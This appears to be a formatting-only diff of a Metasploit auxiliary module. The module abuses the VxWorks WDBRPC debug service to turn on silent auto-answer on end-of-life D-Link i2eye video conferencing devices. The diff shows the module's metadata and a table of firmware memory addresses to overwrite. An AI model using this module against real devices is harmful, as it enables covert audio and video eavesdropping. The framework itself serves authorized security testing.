@@ -7,42 +7,43 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::WDBRPC_Client
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'D-Link i2eye Video Conference AutoAnswer (WDBRPC)',
-      'Description'    => %q{
-        This module can be used to enable auto-answer mode for the D-Link
-      i2eye video conferencing system. Once this setting has been flipped,
-      the device will accept incoming video calls without acknowledgement.
-      The NetMeeting software included in Windows XP can be used to connect
-      to this device. The i2eye product is no longer supported by the vendor
-      and all models have reached their end of life (EOL).
-      },
-      'Author'         => [ 'hdm'],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'D-Link i2eye Video Conference AutoAnswer (WDBRPC)',
+        'Description' => %q{
+          This module can be used to enable auto-answer mode for the D-Link
+          i2eye video conferencing system. Once this setting has been flipped,
+          the device will accept incoming video calls without acknowledgement.
+          The NetMeeting software included in Windows XP can be used to connect
+          to this device. The i2eye product is no longer supported by the vendor
+          and all models have reached their end of life (EOL).
+        },
+        'Author' => [ 'hdm'],
+        'License' => MSF_LICENSE,
+        'References' => [
           ['OSVDB', '66842'],
           ['URL', 'http://blog.metasploit.com/2010/08/vxworks-vulnerabilities.html'],
           ['US-CERT-VU', '362332']
         ]
-      ))
+      )
+    )
   end
 
   def run
-    target  = nil
+    target = nil
     targets = {
       # Original firmware for the North America DVC1000
-      "Sorenson VP100 - ARM9TDMI"   => [[0x00229a05, 0x00000000, 0x00000001]],
+      "Sorenson VP100 - ARM9TDMI" => [[0x00229a05, 0x00000000, 0x00000001]],
 
       # Final firmware for the North America DVC1000
       # Also covers a mislabeled "Sorenson VP100" (revision A3)
-      "i-2-eye DVC1000 - ARM9TDMI"  => [
+      "i-2-eye DVC1000 - ARM9TDMI" => [
         [0x0040cd68, 0x00000000, 0x01000000],
         [0x0040af38, 0x00000000, 0x01000000],
         [0x0040cd00, 0x00000000, 0x01000000]
       ],
     }
-
 
     wdbrpc_client_connect
 
